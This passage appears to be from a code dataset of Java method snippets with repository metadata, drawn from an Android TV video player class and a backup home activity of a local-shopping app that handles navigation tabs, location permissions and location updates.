"https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/player/VideoPlayerGlue.java", "stars": "9", "class_props": {"extends": "PlaybackTransportControlGlue", "implements": null, "modifiers": ["public"]}}, {"id": 58046, "method_name": "onActionClicked", "class_name": "VideoPlayerGlue", "params": ["Action"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActionClicked(Action action) {\n        if (shouldDispatchAction(action)) {\n            dispatchAction(action);\n            return;\n        }\n        // Super class handles play/pause and delegates to abstract methods next()/previous().\n        super.onActionClicked(action);\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/player/VideoPlayerGlue.java", "stars": "9", "class_props": {"extends": "PlaybackTransportControlGlue", "implements": null, "modifiers": ["public"]}}, {"id": 58047, "method_name": "shouldDispatchAction", "class_name": "VideoPlayerGlue", "params": ["Action"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean shouldDispatchAction(Action action) {\n        return action == mRewindAction\n                || action == mFastForwardAction\n                || action == mPipAction\n                || action == mHighQuality;\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/player/VideoPlayerGlue.java", "stars": "9", "class_props": {"extends": "PlaybackTransportControlGlue", "implements": null, "modifiers": ["public"]}}, {"id": 58048, "method_name": "dispatchAction", "class_name": "VideoPlayerGlue", "params": ["Action"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void dispatchAction(Action action) {\n        // Primary actions are handled manually.\n        if (action == mRewindAction) {\n            rewind();\n        } else if (action == mFastForwardAction) {\n            fastForward();\n        } else if (action == mPipAction) {\n            showPip();\n        } else if(action == mHighQuality) {\n            onScaleUp();\n        } else if (action == mClosedCaptionAction) {\n            onCloseCaption();\n        } else if (action instanceof PlaybackControlsRow.MultiAction) {\n            PlaybackControlsRow.MultiAction multiAction = (PlaybackControlsRow.MultiAction) action;\n            multiAction.nextIndex();\n            // Notify adapter of action changes to handle secondary actions, such as, thumbs up/down\n            // and repeat.\n            notifyActionChanged(\n                    multiAction,\n                    (ArrayObjectAdapter) getControlsRow().getSecondaryActionsAdapter());\n        }\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/player/VideoPlayerGlue.java", "stars": "9", "class_props": {"extends": "PlaybackTransportControlGlue", "implements": null, "modifiers": ["public"]}}, {"id": 58049, "method_name": "notifyActionChanged", "class_name": "VideoPlayerGlue", "params": ["PlaybackControlsRow", "ArrayObjectAdapter"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void notifyActionChanged(\n            PlaybackControlsRow.MultiAction action, ArrayObjectAdapter adapter) {\n        if (adapter != null) {\n            int index = adapter.indexOf(action);\n            if (index >= 0) {\n                adapter.notifyArrayItemRangeChanged(index, 1);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/player/VideoPlayerGlue.java", "stars": "9", "class_props": {"extends": "PlaybackTransportControlGlue", "implements": null, "modifiers": ["public"]}}, {"id": 58050, "method_name": "next", "class_name": "VideoPlayerGlue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void next() {\n        mActionListener.onNext();\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/player/VideoPlayerGlue.java", "stars": "9", "class_props": {"extends": "PlaybackTransportControlGlue", "implements": null, "modifiers": ["public"]}}, {"id": 58051, "method_name": "previous", "class_name": "VideoPlayerGlue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void previous() {\n        mActionListener.onPrevious();\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/player/VideoPlayerGlue.java", "stars": "9", "class_props": {"extends": "PlaybackTransportControlGlue", "implements": null, "modifiers": ["public"]}}, {"id": 58052, "method_name": "onScaleUp", "class_name": "VideoPlayerGlue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onScaleUp() {\n        mActionListener.onScaleUp();\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/player/VideoPlayerGlue.java", "stars": "9", "class_props": {"extends": "PlaybackTransportControlGlue", "implements": null, "modifiers": ["public"]}}, {"id": 58053, "method_name": "onCloseCaption", "class_name": "VideoPlayerGlue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCloseCaption() {mActionListener.onCloseCaption();}", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/player/VideoPlayerGlue.java", "stars": "9", "class_props": {"extends": "PlaybackTransportControlGlue", "implements": null, "modifiers": ["public"]}}, {"id": 58054, "method_name": "onMoreActions", "class_name": "VideoPlayerGlue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onMoreActions() {mActionListener.onMoreActions();}", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/player/VideoPlayerGlue.java", "stars": "9", "class_props": {"extends": "PlaybackTransportControlGlue", "implements": null, "modifiers": ["public"]}}, {"id": 58055, "method_name": "rewind", "class_name": "VideoPlayerGlue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void rewind() {\n        long newPosition = getCurrentPosition() - TEN_SECONDS;\n        newPosition = (newPosition < 0) ? 0 : newPosition;\n        getPlayerAdapter().seekTo(newPosition);\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/player/VideoPlayerGlue.java", "stars": "9", "class_props": {"extends": "PlaybackTransportControlGlue", "implements": null, "modifiers": ["public"]}}, {"id": 58056, "method_name": "fastForward", "class_name": "VideoPlayerGlue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void fastForward() {\n        if (getDuration() > -1) {\n            long newPosition = getCurrentPosition() + TEN_SECONDS;\n            newPosition = (newPosition > getDuration()) ? getDuration() : newPosition;\n            getPlayerAdapter().seekTo(newPosition);\n        }\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/player/VideoPlayerGlue.java", "stars": "9", "class_props": {"extends": "PlaybackTransportControlGlue", "implements": null, "modifiers": ["public"]}}, {"id": 58057, "method_name": "showPip", "class_name": "VideoPlayerGlue", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void showPip() {\n        if (this.activity == null) return;\n        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {\n            //int videoWidth = mPlayer.getVideoFormat().width;\n            //int videoHeight = mPlayer.getVideoFormat().height;\n            PictureInPictureParams params = null;\n                params = new PictureInPictureParams.Builder()\n                        //.setAspectRatio(new Rational(videoWidth, videoHeight))\n                        .build();\n            this.activity.enterPictureInPictureMode(params);\n        }\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/player/VideoPlayerGlue.java", "stars": "9", "class_props": {"extends": "PlaybackTransportControlGlue", "implements": null, "modifiers": ["public"]}}, {"id": 58058, "method_name": "onCreate", "class_name": "HomeBackup1May20", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_home_new);\n\n        bottomBar = findViewById(R.id.bottom_navigation);\n\n//        bottomBar.setDefaultTab(R.id.tab_search);\n        AppCompatDelegate.setCompatVectorFromResourcesEnabled(true);\n\n\n\n        startService(new Intent(this,UpdateServiceConfiguration.class));\n\n\n\n        FirebaseApp.initializeApp(getApplicationContext());\n        UtilityFunctions.updateFirebaseSubscriptions();\n\n\n\n\n\n        if (PrefGeneral.getMultiMarketMode(this)) {\n\n            bottomBar.getMenu().getItem(4).setTitle(\"Markets\");\n\n//            bottomBar.getTabWithId(R.id.tab_profile).setTitle(\"Markets\");\n        }\n        else\n        {\n\n            bottomBar.getMenu().getItem(4).setTitle(\"Profile\");\n\n\n//            bottomBar.getTabWithId(R.id.tab_profile).setTitle(\"Profile\");\n        }\n\n\n        bottomBar.getMenu().getItem(1).setVisible(false);\n\n\n        bottomBar.setOnNavigationItemSelectedListener(new BottomNavigationView.OnNavigationItemSelectedListener() {\n            @Override\n            public boolean onNavigationItemSelected(@NonNull MenuItem menuItem) {\n\n\n                if(menuItem.getItemId()== R.id.bottom_tab_items)\n                {\n                    showItemsFragment();\n                }\n                else if(menuItem.getItemId()== R.id.bottom_tab_shops)\n                {\n                    showShopsFragment();\n                }\n                else if(menuItem.getItemId()== R.id.bottom_tab_cart)\n                {\n                    showCartFragment();\n                }\n                else if(menuItem.getItemId()== R.id.bottom_tab_orders)\n                {\n                    showOrdersFragment();\n                }\n                else if(menuItem.getItemId()== R.id.bottom_tab_profile)\n                {\n                    showProfileFragment(false);\n                }\n\n\n                return true;\n            }\n        });\n\n\n//        bottomBar.setSelectedItemId(R.id.bottom_tab_items);\n\n\n\n\n        if(savedInstanceState==null)\n        {\n//            showToast(\"Home : OnSaveInstanceState\");\n            initialFragmentSetup();\n        }\n\n\n\n//        startSettingsCheck();\n\n\n\n        checkPermissions();\n        fetchLocation();\n\n\n\n\n        if (PrefGeneral.getServiceURL(this) != null\n                && PrefOneSignal.getToken(this) != null\n                && PrefLogin.getUser(this)!=null) {\n\n                startService(new Intent(getApplicationContext(), UpdateOneSignalID.class));\n        }\n\n\n\n\n\n        if (PrefServiceConfig.getServiceConfigLocal(this) == null && PrefGeneral.getServiceURL(this) != null) {\n            // get service configuration when its null ... fetches config at first install or changing service\n            startService(new Intent(getApplicationContext(), UpdateServiceConfiguration.class));\n        }\n\n\n\n\n\n\n        setupBottomBarLights();\n\n\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/zzBackups/HomeBackup1May20.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["ShowFragment", "NotifyAboutLogin", "MarketSelected"], "modifiers": ["public"]}}, {"id": 58059, "method_name": "setupBottomBarLights", "class_name": "HomeBackup1May20", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void setupBottomBarLights()\n    {\n        getSupportFragmentManager().addOnBackStackChangedListener(new FragmentManager.OnBackStackChangedListener() {\n            @Override\n            public void onBackStackChanged() {\n\n                Fragment fragment = getSupportFragmentManager().findFragmentById(R.id.fragment_container);\n\n                if(fragment instanceof MarketsFragmentNew)\n                {\n//                    bottomBar.selectTabWithId(R.id.tab_profile);\n//                    bottomBar.setSelectedItemId(R.id.tab_profile);\n\n                    bottomBar.getMenu().getItem(4).setChecked(true);\n                }\n                else if(fragment instanceof ProfileFragment)\n                {\n                    bottomBar.getMenu().getItem(4).setChecked(true);\n                }\n                else if(fragment instanceof OrdersHistoryFragment)\n                {\n                    bottomBar.getMenu().getItem(3).setChecked(true);\n\n                }\n                else if(fragment instanceof CartsListFragment)\n                {\n                    bottomBar.getMenu().getItem(2).setChecked(true);\n                }\n                else if(fragment instanceof FragmentShopsList)\n                {\n                    bottomBar.getMenu().getItem(1).setChecked(true);\n                }\n                else if(fragment instanceof ItemsByCatFragment)\n                {\n\n                    bottomBar.getMenu().getItem(0).setChecked(true);\n\n                }\n                else if(fragment instanceof FragmentSignInMessage)\n                {\n//                    bottomBar.getMenu().getItem(3).setChecked(true);\n                }\n\n\n\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/zzBackups/HomeBackup1May20.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["ShowFragment", "NotifyAboutLogin", "MarketSelected"], "modifiers": ["public"]}}, {"id": 58060, "method_name": "showLogMessage", "class_name": "HomeBackup1May20", "params": ["String"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void showLogMessage(String message) {\n        Log.d(\"log_home_screen\", message);\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/zzBackups/HomeBackup1May20.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["ShowFragment", "NotifyAboutLogin", "MarketSelected"], "modifiers": ["public"]}}, {"id": 58061, "method_name": "loginSuccess", "class_name": "HomeBackup1May20", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void loginSuccess() {\n\n\n        getSupportFragmentManager().popBackStackImmediate(\n                null,\n                FragmentManager.POP_BACK_STACK_INCLUSIVE\n        );\n\n        marketSelected();\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/zzBackups/HomeBackup1May20.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["ShowFragment", "NotifyAboutLogin", "MarketSelected"], "modifiers": ["public"]}}, {"id": 58062, "method_name": "loggedOut", "class_name": "HomeBackup1May20", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void loggedOut() {\n        showProfileFragment(true);\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/zzBackups/HomeBackup1May20.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["ShowFragment", "NotifyAboutLogin", "MarketSelected"], "modifiers": ["public"]}}, {"id": 58063, "method_name": "showLoginFragment", "class_name": "HomeBackup1May20", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void showLoginFragment() {\n\n\n        if(getSupportFragmentManager().findFragmentByTag(TAG_LOGIN)==null)\n        {\n            getSupportFragmentManager()\n                    .beginTransaction()\n                    .replace(R.id.fragment_container, new FragmentSignInMessage(), TAG_LOGIN)\n                    .commit();\n        }\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/zzBackups/HomeBackup1May20.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["ShowFragment", "NotifyAboutLogin", "MarketSelected"], "modifiers": ["public"]}}, {"id": 58064, "method_name": "checkPermissions", "class_name": "HomeBackup1May20", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void checkPermissions() {\n\n        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {\n            // TODO: Consider calling\n            //    ActivityCompat#requestPermissions\n            // here to request the missing permissions, and then overriding\n            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,\n            //                                          int[] grantResults)\n            // to handle the case where the user grants the permission. See the documentation\n            // for ActivityCompat#requestPermissions for more details.\n\n\n            //\n            ActivityCompat.requestPermissions(\n                    this,\n                    new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION},\n                    2);\n            return;\n        }\n\n\n//        fetchLocation();\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/zzBackups/HomeBackup1May20.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": ["ShowFragment", "NotifyAboutLogin", "MarketSelected"], "modifiers": ["public"]}}, {"id": 58065, "method_name": "onRequestPermissionsResult", "class_name": "HomeBackup1May20", "params": ["int", "String", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onRequestPermissionsResult(int requestCode,\n                                           String[] permissions, int[] grantResults) {\n        //\n//        if(requestCode==2)\n//        {\n//            // If request is cancelled, the result arrays are empty.\n//\n//\n        if (grantResults.length > 0\n                && grantResults[0] == PackageManager.PERMISSION_GRANTED) {\n            // permission was granted, yay! Do the\n            // contacts-related task you need to do.\n            //                startService(new Intent(this,LocationUpdateServiceLocal.class));\n\n            showToastMessage(\"Permission Granted !\");\n\n//            Fragment fragment = getSupportFragmentManager().findFragmentByTag(TAG_ITEMS_FRAGMENT);\n\n\n//            Fragment fragment = getSupportFragmentManager().findFragmentById(R.id.fragment_container);\n//\n//\n//            if (fragment instanceof LocationUpdated) {\n//                ((LocationUpdated) fragment).permissionGranted();\n//            }\n\n\n            startService(new Intent(this, LocationUpdateService.class));\n\n            fetchLocation();\n\n\n\n        } else {\n            // permission denied, boo! Disable the\n            // functionality that depends on this permission.\n            showToastMessage(\"Permission Rejected\");\n        }\n\n\n    }\n\n\n\n\n\n\n    @Override\n    public void showProfileFragment(boolean refreshFragment) {\n\n        if (PrefGeneral.getMultiMarketMode(this)) {\n            // no market selected therefore show available markets in users area\n\n\n            if(refreshFragment)\n            {\n                getSupportFragmentManager()\n                        .beginTransaction()\n                        .replace(R.id.fragment_container, new MarketsFragmentNew(), TAG_MARKET_FRAGMENT)\n                        .commit();\n            }\n            else\n            {\n\n                if (getSupportFragmentManager().findFragmentByTag(TAG_MARKET_FRAGMENT) == null) {\n\n                    getSupportFragmentManager()\n                            .beginTransaction()\n                            .replace(R.id.fragment_container, new MarketsFragmentNew(), TAG_MARKET_FRAGMENT)\n                            .commit();\n                }\n            }\n\n\n        } else {\n            // single market mode\n\n            if (PrefLogin.getUser(getBaseContext()) == null) {\n\n\n                showLoginFragment();\n\n            }\n            else {\n\n\n\n                if(getSupportFragmentManager().findFragmentByTag(TAG_PROFILE)==null)\n                {\n                    getSupportFragmentManager()\n                            .beginTransaction()\n                            .replace(R.id.fragment_container, new ProfileFragment(), TAG_PROFILE)\n                            .commit();\n                }\n\n\n            }\n\n        }\n\n    }\n\n\n\n    @Override\n    public void showOrdersFragment() {\n\n\n\n\n        if (PrefGeneral.getMultiMarketMode(this) && PrefGeneral.getServiceURL(this) == null) {\n            // no market selected therefore show available markets in users area\n\n\n            if (getSupportFragmentManager().findFragmentByTag(TAG_MARKET_FRAGMENT) == null) {\n                getSupportFragmentManager()\n                        .beginTransaction()\n                        .replace(R.id.fragment_container, new MarketsFragmentNew(), TAG_MARKET_FRAGMENT)\n                        .commit();\n\n            }\n\n\n//            getSupportFragmentManager()\n//                    .beginTransaction()\n//                    .replace(R.id.fragment_container, new MarketsFragmentNew(), TAG_MARKET_FRAGMENT)\n//                    .addToBackStack(null)\n//                    .commit();\n\n\n        } else if (PrefLogin.getUser(getBaseContext()) == null) {\n\n            showLoginFragment();\n\n        }\n        else {\n\n\n\n            if(getSupportFragmentManager().findFragmentByTag(TAG_ORDERS_FRAGMENT)==null)\n            {\n                getSupportFragmentManager()\n                        .beginTransaction()\n                        .replace(R.id.fragment_container, OrdersHistoryFragment.newInstance(true,false,false), TAG_ORDERS_FRAGMENT)\n                        .commitNow();\n\n            }\n        }\n    }\n\n\n\n    @Override\n    public void showCartFragment() {\n\n\n        if (PrefGeneral.getMultiMarketMode(this) && PrefGeneral.getServiceURL(this) == null) {\n            // no market selected therefore show available markets in users area\n\n\n            if (getSupportFragmentManager().findFragmentByTag(TAG_MARKET_FRAGMENT) == null) {\n                getSupportFragmentManager()\n                        .beginTransaction()\n                        .replace(R.id.fragment_container, new MarketsFragmentNew(), TAG_MARKET_FRAGMENT)\n                        .commitNow();\n\n            }\n\n//            getSupportFragmentManager()\n//                    .beginTransaction()\n//                    .replace(R.id.fragment_container, new MarketsFragmentNew(), TAG_MARKET_FRAGMENT)\n//                    .addToBackStack(null)\n//                    .commit();\n\n\n\n        } else if (PrefLogin.getUser(getBaseContext()) == null) {\n\n            showLoginFragment();\n            return;\n\n        }\n\n        else {\n\n\n            if(getSupportFragmentManager().findFragmentByTag(TAG_CARTS_FRAGMENT)==null)\n            {\n                getSupportFragmentManager()\n                        .beginTransaction()\n                        .replace(R.id.fragment_container, new CartsListFragment(), TAG_CARTS_FRAGMENT)\n                        .commitNow();\n\n            }\n\n\n\n//            getSupportFragmentManager()\n//                    .beginTransaction()\n//                    .replace(R.id.fragment_container, new CartsListFragment(), TAG_CARTS_FRAGMENT)\n//                    .addToBackStack(null)\n//                    .commit();\n\n\n\n        }\n    }\n\n\n\n\n\n//    Fragment fragmentShop;\n\n    @Override\n    public void showShopsFragment() {\n\n\n        if (PrefGeneral.getMultiMarketMode(this) && PrefGeneral.getServiceURL(this) == null) {\n            // no market selected therefore show available markets in users area\n\n\n\n\n            if (getSupportFragmentManager().findFragmentByTag(TAG_MARKET_FRAGMENT) == null) {\n\n                getSupportFragmentManager()\n                        .beginTransaction()\n                        .replace(R.id.fragment_container, new MarketsFragmentNew(), TAG_MARKET_FRAGMENT)\n                        .commitNow();\n\n            }\n\n\n//            getSupportFragmentManager()\n//                    .beginTransaction()\n//                    .replace(R.id.fragment_container, new MarketsFragmentNew(), TAG_MARKET_FRAGMENT)\n//                    .addToBackStack(null)\n//                    .commit();\n\n\n\n        } else {\n\n\n\n//            else\n//            {\n//                getSupportFragmentManager()\n//                        .beginTransaction()\n//                        .show(getSupportFragmentManager().findFragmentByTag(TAG_SHOPS_FRAGMENT));\n//            }\n\n\n\n\n\n\n\n//\n//\n//            if(!getSupportFragmentManager().popBackStackImmediate(\"shop_fragment\",0))\n//            {\n//                getSupportFragmentManager()\n//                        .beginTransaction()\n//                        .replace(R.id.fragment_container, FragmentShopNewBackup.newInstance(false), TAG_SHOPS_FRAGMENT)\n//                        .addToBackStack(\"shop_fragment\")\n//                        .commit();\n//            }\n\n\n\n//\n//            if(fragmentShop==null)\n//            {\n//                fragmentShop = FragmentShopNewBackup.newInstance(false);\n//            }\n\n\n\n\n\n\n            if (getSupportFragmentManager().findFragmentByTag(TAG_SHOPS_FRAGMENT) == null) {\n                getSupportFragmentManager()\n                        .beginTransaction()\n                        .replace(R.id.fragment_container, new ItemsInShopByCatFragment(), TAG_SHOPS_FRAGMENT)\n                        .commitNow();\n\n//                FragmentShopsList.newInstance(false)\n            }\n\n\n\n\n//\n//            getSupportFragmentManager()\n//                    .beginTransaction()\n//                    .replace(R.id.fragment_container, FragmentShopsList.newInstance(false), TAG_SHOPS_FRAGMENT)\n//                    .addToBackStack(\"shop_fragment\")\n//                    .commit();\n\n\n\n        }\n\n\n\n    }\n\n\n\n\n\n    @Override\n    public void showItemsFragment() {\n\n\n\n//        showToast(\"Show Items Triggered !\");\n\n\n        if (PrefGeneral.getMultiMarketMode(this) && PrefGeneral.getServiceURL(this) == null) {\n            // no market selected therefore show available markets in users area\n\n\n            if (getSupportFragmentManager().findFragmentByTag(TAG_MARKET_FRAGMENT) == null) {\n                getSupportFragmentManager()\n                        .beginTransaction()\n                        .replace(R.id.fragment_container, new MarketsFragmentNew(), TAG_MARKET_FRAGMENT)\n                        .commitNow();\n\n            }\n\n\n//            getSupportFragmentManager()\n//                    .beginTransaction()\n//                    .replace(R.id.fragment_container, new MarketsFragmentNew(), TAG_MARKET_FRAGMENT)\n//                    .addToBackStack(null)\n//                    .commit();\n\n        }\n        else {\n\n\n\n            if (getSupportFragmentManager().findFragmentByTag(TAG_ITEMS_FRAGMENT) == null) {\n                getSupportFragmentManager()\n                        .beginTransaction()\n                        .replace(R.id.fragment_container, new ItemsByCatFragment(), TAG_ITEMS_FRAGMENT)\n                        .commitNow();\n            }\n\n//            else {\n//                getSupportFragmentManager().popBackStack();\n//            }\n\n\n//            getSupportFragmentManager()\n//                    .beginTransaction()\n//                    .replace(R.id.fragment_container, new ItemsByCatFragment(), TAG_ITEMS_FRAGMENT)\n//                    .addToBackStack(\"items\")\n//                    .commit();\n\n\n\n\n\n\n        }\n    }\n\n\n\n\n\n    void initialFragmentSetup()\n    {\n        if (PrefGeneral.getMultiMarketMode(this) && PrefGeneral.getServiceURL(this) == null) {\n            // no market selected therefore show available markets in users area\n\n\n\n            getSupportFragmentManager()\n                    .beginTransaction()\n                    .replace(R.id.fragment_container, new MarketsFragmentNew(), TAG_MARKET_FRAGMENT)\n                    .commitNow();\n\n\n        }\n        else {\n\n//            new ItemsDatabaseForAdminFragment()\n\n\n            getSupportFragmentManager()\n                    .beginTransaction()\n                    .replace(R.id.fragment_container, FragmentShopsList.newInstance(false), TAG_SHOPS_FRAGMENT)\n                    .commitNow();\n\n\n        }\n    }\n\n\n\n\n\n\n    void showToastMessage(String message) {\n        Toast.makeText(this, message, Toast.LENGTH_SHORT).show();\n    }\n\n\n    boolean isDestroyed = false;\n\n\n    @Override\n    public void onBackPressed() {\n\n\n\n//        Fragment fragment = getSupportFragmentManager()\n//                .findFragmentByTag(TAG_ITEMS_FRAGMENT);\n//\n//\n//        if (fragment == null) {\n//            fragment = getSupportFragmentManager()\n//                    .findFragmentByTag(TAG_SHOPS_FRAGMENT);\n//        }\n\n\n        Fragment fragment = getSupportFragmentManager().findFragmentById(R.id.fragment_container);\n\n\n        if (fragment instanceof NotifyBackPressed) {\n//            showLogMessage(\"Fragment Instanceof NotifyBackPressed !\");\n\n            if (((NotifyBackPressed) fragment).backPressed()) {\n                super.onBackPressed();\n            }\n        } else {\n            super.onBackPressed();\n        }\n    }\n\n\n\n\n\n\n\n    @Override\n    public boolean onCreateOptionsMenu(Menu menu) {\n        super.onCreateOptionsMenu(menu);\n        MenuInflater inflater = getMenuInflater();\n        inflater.inflate(R.menu.menu_items_by_cat_simple, menu);\n\n\n        // Associate searchable configuration with the SearchView\n        SearchView searchView = (SearchView) menu.findItem(R.id.action_search).getActionView();\n        SearchManager searchManager = (SearchManager) getSystemService(SEARCH_SERVICE);\n        searchView.setSearchableInfo(searchManager.getSearchableInfo(getComponentName()));\n\n\n        MenuItem item = menu.findItem(R.id.action_search);\n\n        item.setOnActionExpandListener(new MenuItem.OnActionExpandListener() {\n            @Override\n            public boolean onMenuItemActionExpand(MenuItem item) {\n\n                return true;\n            }\n\n            @Override\n            public boolean onMenuItemActionCollapse(MenuItem item) {\n\n                Fragment fragment = getSupportFragmentManager().findFragmentById(R.id.fragment_container);\n\n                if (fragment instanceof NotifySearch) {\n                    ((NotifySearch) fragment).endSearchMode();\n                }\n\n//                Toast.makeText(Home.this, \"onCollapsed Called \", Toast.LENGTH_SHORT).show();\n\n                return true;\n            }\n        });\n\n\n        return true;\n    }\n\n\n\n\n\n\n\n    void showToast(String message) {\n        Toast.makeText(this, message, Toast.LENGTH_SHORT).show();\n    }\n\n\n    @Override\n    protected void onNewIntent(Intent intent) {\n        super.onNewIntent(intent);\n\n        handleIntent(intent);\n    }\n\n\n    private void handleIntent(Intent intent) {\n\n        if (Intent.ACTION_SEARCH.equals(intent.getAction())) {\n            String query = intent.getStringExtra(SearchManager.QUERY);\n            //use the query to search your data somehow\n\n//            Toast.makeText(this,query,Toast.LENGTH_SHORT).show();\n\n\n            Fragment fragment = getSupportFragmentManager().findFragmentById(R.id.fragment_container);\n\n\n            if (fragment instanceof NotifySearch) {\n                ((NotifySearch) fragment).search(query);\n            }\n        }\n    }\n\n\n\n\n\n    @Override\n    public void marketSelected() {\n\n//            bottomBar.selectTabWithId(R.id.tab_items);\n//            bottomBar.selectTabAtPosition(bottomBar.getCurrentTabPosition());\n//            showItemsFragment();\n\n\n//        showToastMessage(\"Market Selected : Home \");\n\n\n\n        getSupportFragmentManager().popBackStackImmediate(\n                null,\n                FragmentManager.POP_BACK_STACK_INCLUSIVE\n        );\n\n\n\n        int tabId = bottomBar.getSelectedItemId();\n\n\n        if (tabId == R.id.bottom_tab_items) {\n            showItemsFragment();\n        } else if (tabId == R.id.bottom_tab_shops) {\n\n            showShopsFragment();\n        } else if (tabId == R.id.bottom_tab_cart) {\n\n            showCartFragment();\n        } else if (tabId == R.id.bottom_tab_orders) {\n\n            showOrdersFragment();\n\n        } else if (tabId == R.id.bottom_tab_profile) {\n\n//                showProfileFragment();\n//                showItemsFragment();\n            bottomBar.setSelectedItemId(R.id.bottom_tab_shops);\n\n        }\n\n    }\n\n\n    @Override\n    protected void onDestroy() {\n        super.onDestroy();\n        stopLocationUpdates();\n\n        PrefLocation.setLocationSetByUser(false,this);\n    }\n\n\n\n\n\n\n    private LocationRequest mLocationRequestTwo;\n    private com.google.android.gms.location.LocationCallback locationCallback;\n\n\n\n    void fetchLocation() {\n\n        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED\n                && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED)\n        {\n            // TODO: Consider calling\n            //    ActivityCompat#requestPermissions\n            // here to request the missing permissions, and then overriding\n            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,\n            //                                          int[] grantResults)\n            // to handle the case where the user grants the permission. See the documentation\n            // for ActivityCompat#requestPermissions for more details.\n\n            showToastMessage(\"We cannot access Location ... Please grant permission for Location access !\");\n\n            return;\n        }\n\n\n\n\n        mLocationRequestTwo = LocationRequest.create();\n        mLocationRequestTwo.setInterval(1000);\n        mLocationRequestTwo.setSmallestDisplacement(10);\n        mLocationRequestTwo.setFastestInterval(1000);\n        mLocationRequestTwo.setPriority(LocationRequest.PRIORITY_BALANCED_POWER_ACCURACY);\n\n\n//        locationCallback = new MyLocationCallback();\n\n        locationCallback = new com.google.android.gms.location.LocationCallback(){\n            @Override\n            public void onLocationResult(com.google.android.gms.location.LocationResult locationResult) {\n                super.onLocationResult(locationResult);\n\n                if(HomeBackup1May20.this.isDestroyed())\n                {\n                    return;\n                }\n\n                double lat = 0;\n                double lon = 0;\n\n                Location location = 